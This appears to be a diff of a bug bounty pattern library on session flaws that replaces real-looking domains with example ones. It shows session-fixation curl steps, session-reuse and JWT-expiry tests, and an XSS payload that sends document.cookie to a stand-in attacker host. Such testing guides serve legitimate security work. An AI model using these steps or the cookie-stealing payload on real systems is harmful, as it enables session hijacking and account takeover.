@@ -11,14 +11,14 @@ Pattern library built from 18 public bug bounty reports.
 **Attack:**
 ```bash
 # Step 1: Set attacker-controlled session ID (pre-auth request)
-curl -s -c - https://target.com/login \
+curl -s -c - https://target.example/login \
   -H "Cookie: PHPSESSID=attacker-controlled-12345" > /dev/null
 
 # Step 2: Social engineer admin to open:
-# https://target.com/login?PHPSESSID=attacker-controlled-12345
+# https://target.example/login?PHPSESSID=attacker-controlled-12345
 
 # Step 3: After admin logs in with attacker's session ID, use it:
-curl -s https://target.com/admin \
+curl -s https://target.example/admin \
   -H "Cookie: PHPSESSID=attacker-controlled-12345"
 # Returns admin panel content
 ```
@@ -34,17 +34,17 @@ curl -s https://target.com/admin \
 **Test:**
 ```bash
 # 1. Login
-SESSION=$(curl -s -c - -X POST https://target.com/api/login \
+SESSION=$(curl -s -c - -X POST https://target.example/api/login \
   -d '{"email":"test@test.com","password":"pass"}' | \
   grep -i "session" | awk '{print $7}')
 
 # 2. Logout
-curl -s -X POST https://target.com/api/logout \
+curl -s -X POST https://target.example/api/logout \
   -H "Cookie: session=$SESSION"
 
 # 3. Use old session
 STATUS=$(curl -s -o /dev/null -w "%{http_code}" \
-  https://target.com/api/me -H "Cookie: session=$SESSION")
+  https://target.example/api/me -H "Cookie: session=$SESSION")
 echo "Post-logout status: $STATUS"
 # Expected: 401. Got: 200 → VULNERABLE
 ```
@@ -89,7 +89,7 @@ Set-Cookie: session=TOKEN123; Path=/; SameSite=Lax
 
 **XSS payload:**
 ```javascript
-fetch('https://evil.com/steal?c=' + encodeURIComponent(document.cookie));
+fetch('https://evil.example/steal?c=' + encodeURIComponent(document.cookie));
 ```
 
 **Note:** This is a chained finding — report as part of the XSS finding, not standalone.
@@ -118,7 +118,7 @@ JWT="eyJ..."
 
 # Logout (client-side only)
 # Wait 24 hours, then:
-curl -s https://target.com/api/me -H "Authorization: Bearer $JWT"
+curl -s https://target.example/api/me -H "Authorization: Bearer $JWT"
 # If returns 200 → no expiry
 ```
 
@@ -146,10 +146,10 @@ jwt_tool TOKEN -d   # decode and display all claims
 
 # Session entropy analysis
 for i in $(seq 1 10); do
-  curl -sI https://target.com/ | grep -i "set-cookie" | grep -oP 'session=\K[^;]+'
+  curl -sI https://target.example/ | grep -i "set-cookie" | grep -oP 'session=\K[^;]+'
 done
 
 # Cookie attribute check
-curl -sI https://target.com/ | grep -i "set-cookie"
+curl -sI https://target.example/ | grep -i "set-cookie"
 # Verify: HttpOnly, Secure, SameSite=Strict/Lax present
 ```
